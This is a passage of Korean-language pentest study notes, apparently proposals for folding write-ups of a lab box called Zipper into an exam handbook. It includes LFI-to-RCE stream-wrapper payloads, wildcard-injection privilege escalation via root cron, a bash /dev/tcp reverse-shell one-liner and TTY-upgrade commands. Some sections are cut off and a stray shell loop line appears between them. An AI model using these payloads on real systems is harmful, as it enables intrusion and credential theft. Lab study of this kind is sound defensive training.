## 제안 1 — 신규 (B-1. 웹 하위)

**절**: 신규 (B-1x 후보)
**제목 후보**: `PHP 스트림 래퍼로 LFI 를 RCE 로 확장`
**병합/신규**: 신규
**넣을 본문**:

```text
**탐지** — `?file=`·`?page=`·`?include=`·`?path=` 파라미터를 보면 `php://filter`가 첫 수다.

| 래퍼 | 하는 일 | LFI 에서의 용도 | `allow_url_include` 영향 |
|---|---|---|---|
| `php://filter/...` | 스트림을 읽으며 필터 통과 | 소스 코드 유출 | 안 받음(로컬 래퍼) |
| `zip://<아카이브>#<내부경로>` | zip 내부 파일을 스트림으로 | 아카이브 안 웹셸 실행 | 안 받음 |
| `phar://<파일>/<내부경로>` (PHP < 8.0) | phar 내부 접근 + 메타데이터 자동 역직렬화 | 업로드 가능하면 역직렬화 RCE, 확장자 무관 | 안 받음. PHP 8.0 부터 스트림 경유 자동 역직렬화 제거 |
| `data://text/plain;base64,...` | URL 에 데이터 직접 포함 | 페이로드를 파일 없이 include | 받음(Off 면 실패) |
| `php://input` | 요청 본문을 스트림으로 | POST 본문에 `<?php ?>` 넣어 RCE | 받음 |
| `expect://` | 명령 직접 실행 | 즉시 RCE, 기본 미설치(PECL 확장 필요) | 미확인 |
| `compress.zlib://`·`compress.bzip2://` | 압축 투명 해제 | gz/bz2 안 파일 읽기 | 안 받음 |

⚠️ `allow_url_include=Off` 는 `zip://`·`phar://`·`php://filter` 를 못 막는다 — "RFI 는 막았다"는 방어자 가정의 빈틈.

**`php://filter/convert.base64-encode/resource=X`** — base64 인코딩이 실행 트리거(`<?php`)를 파괴해 소스가 텍스트로 그대로 출력됨. `string.rot13` 대체 필터는 `short_open_tag=Off`(PHP 기본값)일 때만 같은 효과 — rot13("<?php")=`<?cuc` 라 여는 태그 `<?` 자체는 안 지워지기 때문.

**`zip://<아카이브 경로>#<내부 엔트리>`** — 조건 4개: ①내용을 통제하는 파일이 디스크에 있어야(업로드/로그포이즈닝/세션파일) ②경로를 알아야 ③zip 형식+내부 엔트리 이름을 알아야 ④PHP zip 확장 활성. "업로드가 zip 을 만든다"는 사실 자체가 익스플로잇 조건. 업로드가 zip 을 안 만들어도, 로컬에서 zip 을 만들어 `.jpg` 로 위장해 올리면 됨(래퍼는 매직바이트만 봄, 확장자 화이트리스트로 못 막음).

**출처 박스**: [[Zipper]] — `index.php?file=php://filter/convert.base64-encode/resource=upload` 로 `upload.php` 소스 유출 → `zip://uploads/upload_<time>.zip%23shell` 로 웹셸 실행.
```

**④ 지우기 전 원문 인용** (Zipper.md 구판 2-2·2-3·2-5절 중 표+핵심 문단, 전문은 `03. PG\_backup\Zipper.md.bak2` 참조):

```
| `php://filter/...` | 스트림을 읽으면서 필터를 통과시킨다(인코딩·변환) | 소스 코드 유출 ← 이 박스 1단계 | 받지 않음 (로컬 래퍼) |
| `zip://<아카이브>#<내부경로>` | zip 내부의 한 파일을 스트림으로 연다 | 아카이브 안에 숨긴 웹셸 실행 ← 이 박스 2단계 | 받지 않음 |
| `phar://<파일>/<내부경로>` (**`PHP < 8.0`**) | phar 아카이브 내부 접근 + 메타데이터 자동 역직렬화 | 업로드 가능하면 역직렬화 → RCE. 확장자 무관(`.jpg`도 됨). PHP 8.0부터 스트림 래퍼를 통한 자동 역직렬화가 제거됐다 | 받지 않음 |
...
> [!warning] 이 표에서 시험장에 가져갈 한 줄
> **`allow_url_include=Off`는 `zip://`·`phar://`·`php://filter`를 막지 못한다.**
```

## 제안 2 — 신규 (B-3. 리눅스 권한상승 하위)

**절**: 신규 (B-3x 후보)
**제목 후보**: `와일드카드 인젝션 — 도구별 벡터`
**병합/신규**: 신규 (B-31 「크론 기반 권한상승」은 "대기 패턴"이 주제라 다름. 이 카드는 "글로브 확장이 argv 가 되는" 메커니즘 자체)
**넣을 본문**:

```text
**성립 조건 3가지 동시** — ①고권한 실행(root 크론/`sudo`) ②명령에 글로브(`*`) ③그 글로브가 가리키는 디렉터리에 쓰기 가능.

셸이 글로브를 확장하되 인용부호를 안 붙여준다 — 파일명이 곧 argv 원소가 된다. `-`·`@`로 시작하는 파일명을 만들면 그 자리에서 옵션/지시자로 파싱됨.

| 도구 | 만들 파일명 | 효과 |
|---|---|---|
| `7z`/`7za`/`7zr` | `@파일명` | 리스트파일로 읽음. 심볼릭 링크와 결합하면 임의 파일 읽기(에러 메시지로 유출) |
| | `-i@파일`/`-x@파일` | include/exclude 리스트파일 |
| `tar`(GNU) | `--checkpoint=1` + `--checkpoint-action=exec=sh x.sh` | 아카이빙 중 임의 명령 실행 |
| | `--to-command=sh x.sh` | 추출 시 명령 실행 |
| `rsync` | `-e sh x.sh` | 원격 셸 지정 옵션으로 명령 실행 |
| `chown`/`chmod` | `--reference=<내 소유 파일>` | 소유자/권한을 참조 파일→대상에 복사(방향 주의, 아래) |
| `zip` | `-T`·`-TT`·`sh x.sh #`(별도 argv, `#` 필수) | 무결성 테스트 명령으로 실행 |

⚠️ `chown --reference=A B` 는 **A의 소유권을 읽어 B에 쓴다** — 참조로 지정할 것은 내가 소유한 파일. `--reference=/etc/shadow` 는 반대 방향이라 아무것도 못 얻음.

**`7za`의 `@리스트파일` 메커니즘** — `*.zip` 확장 시 `@enox.zip` 이라는 이름의 파일이 끼면 `7za`가 그 내용을 "압축할 파일 이름 목록"으로 해석. 없는 파일이면 `<내용> : No more files` 경고를 출력 — 그 출력이 저권한이 읽을 수 있는 로그로 가면 임의 파일(심볼릭 링크로 지정한 `/root/secret` 등) 유출.

**출처 박스**: [[Zipper]] — root 크론 `7za a ... *.zip` + `@enox.zip`(리스트파일) + `enox.zip -> /root/secret`(심볼릭 링크) → `backup.log`에 비밀번호 유출.
- [[Cockpit]] — `sudo tar -czvf ... *` (tar 판, 같은 계열)
```

**④ 지우기 전 원문 인용** (구판 4-3·4-4절, 표+메커니즘 설명 핵심):

```
| **`7z` / `7za` / `7zr`** | `@파일명` | 그 파일을 리스트파일로 읽는다. 심볼릭 링크와 결합하면 임의 파일 읽기(에러 메시지로 유출) ← 이 박스 |
...
> [!warning] `--reference` 의 방향을 거꾸로 알면 아무것도 못 얻는다
> `chown --reference=A B` 는 **A의 소유권을 읽어 B에 쓴다.**
...
발상의 핵심은 **내가 읽는 게 아니라 root에게 읽히게 만든다**는 것이다.
```

**증상** — 열거(`id`·`sudo -l`·SUID·`getcap`·크론) 전에 polkit·DirtyPipe·PwnKit 같은 "흔한 CVE" 부터 시도해 시간을 태움. 실패해도 조용해서 그 조용함이 시간을 더 태움.

**출처 박스**: [[Zipper]] — 이 박스의 정답은 5개 반사 명령의 다섯 번째(크론)였음. polkit 은 순손실 구간(~19분, [가정]).

**④ 지우기 전 원문 인용** (구판 6장 ③, 7장 8·9번):

```
> [!warning] "커널/서비스 CVE부터 던지기"는 열거를 대체하지 못한다

## 제안 4 — 병합 (A-3. 셸 → A-31. 리버스셸이 안 붙는다)

**절**: A-31. 리버스셸이 안 붙는다 (기존)
**병합/신규**: 병합 — 기존 "확인 순서" 뒤에 원인 하나 추가
**넣을 본문**:

```text
**원인 후보 추가 — 페이로드가 dash 문법으로 실행돼 깨진다.** PHP `system()`/`exec()` 류는 `/bin/sh`(Ubuntu/Debian 은 dash)로 실행되는데, 리버스셸 원라이너의 `>&`·`0>&1` 는 bash 전용 문법이다. dash 에서 파싱 자체가 실패해 셸이 안 붙는다 — TCP 연결·리스너·아웃바운드는 전부 정상이라 "왜 안 되는지" 진단이 오래 걸리는 실패 유형.

**해법** — `bash -c '...'` 로 감싸 실행 셸을 명시적으로 bash 로 바꾼다.

**출처 박스**: [[Zipper]] — `curl -G --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/.../4444 0>&1'"`. `c=id` 로 먼저 명령 실행 자체를 확인해 "웹셸이 죽었다/명령이 안 된다/네트워크가 막혔다" 3중 원인을 좁힘 — 한 번에 한 변수만 바꾸는 진단 순서.
```

**④ 지우기 전 원문 인용** (구판 3-3절 표 일부):

```
| `bash -c '...'` | `>&`·`0>&1`은 bash 문법이다. `system()`은 `/bin/sh`(dash)로 실행하므로 감싸주지 않으면 실패 | dash에서 `>&` 문법 오류 → 셸이 안 붙는다 ← **원인 파악이 가장 어려운 실패** |
```

## 제안 5 — 신규 (A-2. 진입(foothold) 하위)

**절**: 신규 (A-2x 후보)
**제목 후보**: `# 는 반드시 %23 — URL 프래그먼트가 서버에 안 간다`
**병합/신규**: 신규
**넣을 본문**:

```text
**증상** — `zip://<파일>#<엔트리>` 같이 `#`를 포함한 값을 파라미터에 실어 보내면 200 이 오는데도 아무 일도 안 일어남.

**원인** — `#`는 URL 프래그먼트 구분자. 브라우저·`curl`의 URL 인자·Burp Repeater 의 URL 바가 `#` 뒤를 전부 잘라 서버에 안 보냄. 서버는 `#` 앞부분만 받고 실패.

**해법** — 반드시 `%23`으로 인코딩. `curl` 은 `-G --data-urlencode`에 인코딩을 위임하면 실수 여지가 없음.

**진단** — 실제 도착한 쿼리스트링을 서버 로그나 Burp 에서 확인하면 `#` 유실이 바로 보임.

**출처 박스**: [[Zipper]] — `zip://uploads/upload_....zip%23shell` (`%23`=`#`). 노트 원문 표현: "이 한 글자가 이 박스의 진짜 관문이다".
```

**④ 지우기 전 원문 인용** (구판 2-6절):

```
> [!warning] `%23` — 이 한 글자가 이 박스의 진짜 관문이다
> `#`는 URL 프래그먼트 구분자다. 클라이언트가 잘라먹고 서버로 보내지 않는다.
> 브라우저 주소창·Burp Repeater·`curl`의 URL 인자 어디에서든 **반드시 `%23`으로 써야 한다.**
```

## 제안 6 — 신규 (A-2. 진입(foothold) 하위)

**절**: 신규 (A-2x 후보)
**제목 후보**: `랩 리버트로 업로드·웹셸이 통째로 사라진다`
**병합/신규**: 신규
**넣을 본문**:

```text
**증상** — 작업이 하루 이상 걸리면 랩 인스턴스가 재시작/리버트되어 타겟 IP 가 바뀌고, 그 전에 올려둔 파일(웹셸 등)이 소멸한다.

**실측**([[Zipper]]) — 타겟 IP `192.168.164.229`(7/13) → `192.168.103.229`(7/14). 업로드 아카이브 이름도 `upload_1783926987.zip` → `upload_1783991346.zip`으로 재생성 필요.

**대책** — 페이로드 URL 을 노트에 통째로 적지 말고 "업로드 → 응답에서 파일명 확보 → 그 이름으로 조립" 이라는 **절차**로 적을 것. 타임스탬프가 박힌 URL 은 재사용 불가능하다는 것을 전제로 노트를 쓸 것. 부수 대책으로, 셸을 잡으면 `.ssh/authorized_keys` 추가나 재진입 경로를 확보해 두면 재작업 비용이 줄어든다(단 시험에서는 흔적 정리 의무와 함께 고려).

**출처 박스**: [[Zipper]]
```

for t in $(seq $(( $(date +%s) - 5 )) $(( $(date +%s) + 5 ))); do

## 제안 9 — 신규 (A-3. 셸 하위)

**절**: 신규 (A-3x 후보)
**제목 후보**: `su 는 환경에 따라 TTY 를 요구한다 — 이 박스는 필요 없었다`
**병합/신규**: 신규
**넣을 본문**:

```text
**일반 절차** — `no job control in this shell` 상태의 nc 리버스셸에서 `su` 가 `must be run from a terminal` 로 거부될 수 있음. 대비:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 없으면
script -qc /bin/bash /dev/null
# (Ctrl+Z → 로컬에서) stty raw -echo; fg; export TERM=xterm
```
`echo 'pass' | su -` 는 su 가 stdin 이 아니라 TTY 에서 읽으므로 거부 환경에서는 안 통함. `sshpass`로 SSH 재로그인이나 TTY 확보가 정답.

**[[Zipper]] 에서는 이 단계가 불필요했다** — nc 셸 그대로 `su -`가 통과했고, 비밀번호가 화면에 그대로 에코된 흔적이 남아 있음(pty 없이 stdin 으로 읽었다는 방증). 일반 절차로만 남기고 "이 박스에서 필요했다"로 오독하지 말 것.

**출처 박스**: [[Zipper]]
```
